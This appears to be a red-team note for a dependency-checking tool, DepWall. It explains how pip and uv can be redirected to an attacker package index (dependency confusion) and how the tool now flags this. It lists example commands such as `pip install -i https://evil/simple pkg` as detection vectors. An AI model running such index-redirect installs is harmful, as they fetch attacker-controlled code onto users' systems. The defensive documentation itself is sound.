# Red-team: index redirection (registry hijack / dependency confusion)

Attack class: point pip/uv at a **non-default package index** so a package name
resolves to attacker-controlled artifacts instead of PyPI. Because DepWall
otherwise validates the name against pypi.org, a name that ALSO exists on PyPI
returns a clean verdict while the real fetch comes from the attacker index — a
silent ALLOW.

Vectors (all now → **ASK**, `signal: index-redirect`, allowlist escape hatch):

- CLI: `pip install -i https://evil/simple pkg`, `--index-url=…`, `-ihttps://…`,
  `--extra-index-url …` (dependency confusion), `-f/--find-links https://evil/…`
- uv: `uv pip install --index …`, `--default-index …`, `uv pip sync -f …`
- requirements file: a top-level `--index-url`/`--extra-index-url`/`--find-links`
  line (this fixture) — honored by pip as a global option, followed through
  nested `-r`/`-c` includes.

Verdict ceiling is ASK (never BLOCK on host alone): a foreign index may be a
legitimate private mirror. `DEPWALL_REGISTRY_ALLOWLIST` silences a known host.

Now-covered (see red-team/env-redirect + red-team/npm-registry): `PIP_INDEX_URL`
/ `UV_*` / `NPM_CONFIG_REGISTRY` env vars, cwd `uv.toml` + `pyproject.toml`
`[[tool.uv.index]]` pinning, project `.npmrc`/`.yarnrc`.
Still residual (out of scope): user/global config files (`~/.npmrc`, global
`pip.conf`/`uv.toml`, `~/.yarnrc`), config-relocation vars, `~/.netrc`.

Companion correctness fix: `uv --index`/`--default-index`/`-f`/`--find-links`
were in neither uv value-flag set → their URL was mis-parsed as a positional
package → PyPI 404 false-BLOCK; now consumed + host-checked.
